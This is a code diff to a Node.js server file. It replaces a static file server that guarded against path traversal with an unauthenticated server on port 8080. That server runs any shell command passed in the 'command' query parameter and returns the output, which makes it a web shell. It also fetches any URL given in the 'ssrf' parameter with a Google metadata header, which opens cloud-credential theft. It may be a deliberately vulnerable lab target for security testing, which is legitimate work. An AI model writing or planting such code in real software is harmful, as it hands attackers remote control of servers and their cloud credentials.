@@ -1,30 +1,42 @@
-"use strict";
+var http = require('http'); // 1 - Import Node.js core module
+const { exec } = require("child_process");
+const url = require('url');
+const axios = require('axios')
 
-var fs = require('fs');
-var path = require('path');
-var http = require('http');
+http.createServer(function (req, res) {
+  const queryObject = url.parse(req.url,true).query;
+  console.log(queryObject);
+  var response = ':(';
 
-var staticBasePath = './';
-
-var staticServe = function(req, res) {
-    var resolvedBase = path.resolve(staticBasePath);
-    var safeSuffix = path.normalize(req.url).replace(/^(\.\.[\/\\])+/, '');
-    var fileLoc = path.join(resolvedBase, safeSuffix);
-    
-    fs.readFile(fileLoc, function(err, data) {
-        if (err) {
-            res.writeHead(404, 'Not Found');
-            res.write('404: File Not Found!');
-            return res.end();
+  var command = queryObject['command'];
+  var ssrf = queryObject['ssrf'];
+        if(command){
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    console.log(`error: ${error.message}`);
+                    response = error.message;
+                }
+                else if (stderr) {
+                    console.log(`stderr: ${stderr}`);
+                    response=stderr;
+                }
+                else
+                    response = stdout;
+                res.writeHead(200, {'Content-Type': 'text/html'});
+                res.end(response.toString());              
+                console.log(response);
+            });
         }
-        
-        res.statusCode = 200;
-
-        res.write(data);
-        return res.end();
-    });
-};
-
-var httpServer = http.createServer(staticServe);
-
-httpServer.listen(8080);
+        else if(ssrf){
+            axios.get(ssrf, {headers: {'Metadata-Flavor': 'Google'}}, { transformResponse: (r) => r }).then((r) =>{
+                res.end(JSON.stringify(r.data));        
+            }, (error) => {
+                res.writeHead(200, {'Content-Type': 'text/html'});
+                res.end(error.toString());        
+            });
+        }
+        else{
+            res.writeHead(200, {'Content-Type': 'text/html'});
+            res.end(response);
+        }
+}).listen(8080);
